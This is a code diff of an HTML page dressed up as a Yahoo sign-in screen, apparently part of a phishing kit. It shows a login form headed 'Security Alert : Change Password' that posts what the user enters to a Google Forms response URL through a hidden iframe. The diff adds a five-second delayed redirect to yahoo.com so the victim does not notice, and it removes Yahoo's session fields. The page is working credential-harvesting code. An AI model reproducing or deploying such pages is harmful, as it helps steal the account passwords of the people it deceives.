@@ -27,17 +27,32 @@
                     <div class="login-logo"><img src="yahoo_files/yahoo_en-US_f_p_bestfit_2x.png" alt="Yahoo" class="logo" height="" width="116">
             </div>
                     <p id="error-offline" form action="login.php" role="alert" class="row error-offline hide">Please try&nbsp;again.</p>
-                    
+              
+<script type="text/javascript">   
+    function Redirect() 
+    {  
+        window.location="https://www.yahoo.com"; 
+    } 
+    
+   
+</script>
+				
+			  
 					
 <script type="text/javascript">var submitted=false;</script>
-<iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" onload="if(submitted) {window.location='https://www.yahoo.com';}"></iframe>
+<iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" onload="if(submitted) 
 
+{
+
+
+setTimeout('Redirect()', 5000);
+
+}"></iframe>
+
+						
 					
 					<form id="login-username-form" form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSdiEYbnhhrk58RsvoFd-sV2haQ7PcHLtzuyScArIvx2-pM61w/formResponse" method="post" class="username-challenge " target="hidden_iframe" onsubmit="submitted=true">
-                <input name="crumb" value="b3i5UJ4rpYG" type="hidden">
-                <input name="acrumb" value="KBN5zFTP" type="hidden">
-                <input name="sessionIndex" value="QQ--" type="hidden">
-            
+               
                 <h1 class="sign-in-title" id="mbr-login-greeting">
                       Security Alert : Change Password 
                         </h1>
